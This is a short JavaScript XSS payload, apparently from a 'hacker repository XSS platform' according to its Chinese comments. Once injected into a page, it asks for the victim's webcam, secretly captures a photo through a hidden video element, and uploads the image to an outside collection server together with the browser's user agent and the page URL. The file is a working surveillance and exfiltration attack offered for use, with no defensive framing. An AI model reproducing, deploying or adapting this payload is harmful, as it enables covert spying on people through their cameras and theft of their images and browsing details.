// 摄像头拍照上传Payload - 黑客仓库XSS平台
// 调用摄像头拍照并上传到服务器

(function() {
    'use strict';
    
    var config = {
        serverUrl: 'https://xss.li/api/collect.php',
        quality: 0.8,
        width: 640,
        height: 480
    };
    
    // 请求摄像头权限并拍照
    async function capturePhoto() {
        try {
            console.log('📷 黑客仓库XSS - 正在请求摄像头权限...');
            
            // 请求摄像头访问
            const stream = await navigator.mediaDevices.getUserMedia({
                video: {
                    width: { ideal: config.width },
                    height: { ideal: config.height }
                }
            });
            
            // 创建视频元素
            const video = document.createElement('video');
            video.srcObject = stream;
            video.autoplay = true;
            video.style.display = 'none';
            document.body.appendChild(video);
            
            // 等待视频加载
            await new Promise(resolve => {
                video.onloadedmetadata = resolve;
            });
            
            // 等待1秒让摄像头稳定
            await new Promise(resolve => setTimeout(resolve, 1000));
            
            // 创建canvas进行截图
            const canvas = document.createElement('canvas');
            canvas.width = config.width;
            canvas.height = config.height;
            const ctx = canvas.getContext('2d');
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            
            // 转换为base64
            const photoData = canvas.toDataURL('image/jpeg', config.quality);
            
            // 停止摄像头
            stream.getTracks().forEach(track => track.stop());
            document.body.removeChild(video);
            
            console.log('📷 拍照成功，正在上传...');
            
            // 发送到服务器
            const response = await fetch(config.serverUrl, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    type: 'camera_capture',
                    photo: photoData,
                    timestamp: new Date().toISOString(),
                    userAgent: navigator.userAgent,
                    url: window.location.href
                })
            });
            
            if (response.ok) {
                console.log('✅ 照片上传成功');
            } else {
                console.log('❌ 照片上传失败');
            }
            
        } catch (error) {
            console.error('摄像头访问失败:', error);
        }
    }
    
    // 执行拍照
    capturePhoto();
    
})();
